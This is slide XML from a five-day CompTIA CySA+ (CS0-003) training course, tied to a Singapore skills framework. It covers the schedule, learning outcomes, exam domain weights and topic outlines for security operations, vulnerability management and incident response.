              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Take your digital attendance and TRAQOM survey here.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Submit your assessment answers on the portal.</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SCHEDULE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Lesson Plan — 5 Days, 8 hours/day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Days 1–3</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Days 4–5 &amp; timing</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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Day 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 1: Security Operations — theory + Labs 1–10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Day 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 2: Vulnerability Management — theory + Labs 11–19</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Day 3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 3: Incident Response &amp; Management — theory + Labs 20–25</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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Day 4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 4: Reporting &amp; Communication — theory + Labs 26–30</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Day 5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Revision + Practice Exam</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Course Feedback &amp; TRAQOM Survey</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Final Assessment (WA + Case Study)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Daily timing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  9:30am–6:30pm · 1-hour lunch · tea breaks within</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SKILLS FRAMEWORK</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WSQ Skills Framework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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  TSC Title: Cyber Risk Management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  TSC Code: ICT-SNA-4007-1.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This course is aligned to the SkillsFuture Singapore (SSG) Skills Framework Technical Skills &amp; Competency (TSC) above.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SKILLS FRAMEWORK</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TSC Knowledge (K)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K1 Cyber risk assessment techniques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  K2 Security risks, threats and vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  K3 Possible treatments of security risks, threats and vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  K4 Required levels of confidentiality, integrity, privacy and personal data protection as well as privacy technologies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SKILLS FRAMEWORK</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TSC Abilities (A)</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A1 Develop cyber risk assessment techniques to identify security loopholes and weaknesses in the business</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A2 Design cyber risk assessments by consolidating insights from the business and various functions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A3 Identify cyber security risks, threats and vulnerabilities, and their impact on the organisation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A4 Identify possible treatments for cyber risks, threats and vulnerabilities identified</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A5 Implement endorsed treatment and measures to address security gaps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ACHIEVE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Learning Outcomes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731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>LO1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Identify cyber security risks, threats, and vulnerabilities, and assess their impact on the organization.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2935224"/>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935224"/>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31181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3063240"/>
            <a:ext cx="9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>LO2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Develop cyber risk assessments by consolidating insights from business to identify security gaps.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4087368"/>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2702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9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>LO3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Identify possible treatments for identified cyber risks, threats, and vulnerabilities.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5239512"/>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5422392"/>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5367528"/>
            <a:ext cx="9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>LO4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Implement endorsed treatment measures to address security gaps and ensure data protection.</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EXAM DOMAINS · CS0-003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CompTIA CySA+ (CS0-003) Exam Domains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731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Security Operations  ·  33%</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>OS &amp; software security, Logging &amp; log ingestion, Network architecture &amp; segmentation, Identity &amp; access management …</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2935224"/>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935224"/>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31181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3063240"/>
            <a:ext cx="9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vulnerability Management  ·  30%</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Asset discovery &amp; network mapping, Vulnerability scanning (OpenVAS/ZAP/Nikto), Analysing scan results, CVSS scoring &amp; prioritisation …</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Rectangle 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4087368"/>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2702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9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Incident Response and Management  ·  20%</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Attack frameworks (Kill Chain, ATT&amp;CK, Diamond), Evidence acquisition &amp; chain of custody, Memory &amp; host forensics, Log analysis for IR …</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5239512"/>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5422392"/>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5367528"/>
            <a:ext cx="9427464" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Reporting and Communication  ·  17%</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Vulnerability management reporting, Executive incident reporting, Security metrics (MTTD/MTTR), Compliance reporting (PCI DSS / ISO 27001 / NIST) …</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EXAM DOMAINS · CS0-003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How This Course Maps to the Exam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The four course topics follow the four CS0-003 exam domains in order and weight:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 1 — Security Operations (33%) · Labs 1–10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 2 — Vulnerability Management (30%) · Labs 11–19</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 3 — Incident Response and Management (20%) · Labs 20–25</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Topic 4 — Reporting and Communication (17%) · Labs 26–30</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Every lab is tagged with the CySA+ exam objective it practises.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COURSE OUTLINE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Course Outline — Topic 1: Security Operations (33%)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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OS &amp; software security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Logging &amp; log ingestion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Network architecture &amp; segmentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identity &amp; access management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Encryption &amp; active defence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Indicators of malicious activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Packet &amp; traffic analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Email analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Threat intelligence &amp; MITRE ATT&amp;CK</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COURSE OUTLINE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Course Outline — Topic 2: Vulnerability Management (30%)</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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Asset discovery &amp; network mapping</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Vulnerability scanning (OpenVAS/ZAP/Nikto)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysing scan results</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CVSS scoring &amp; prioritisation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Web application vulnerabilities (XSS/SQLi)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Exploitation with Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patch management &amp; hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attack surface reconnaissance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COURSE OUTLINE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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Course Outline — Topic 3: Incident Response and Management (20%)</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600" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Attack frameworks (Kill Chain, ATT&amp;CK, Diamond)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
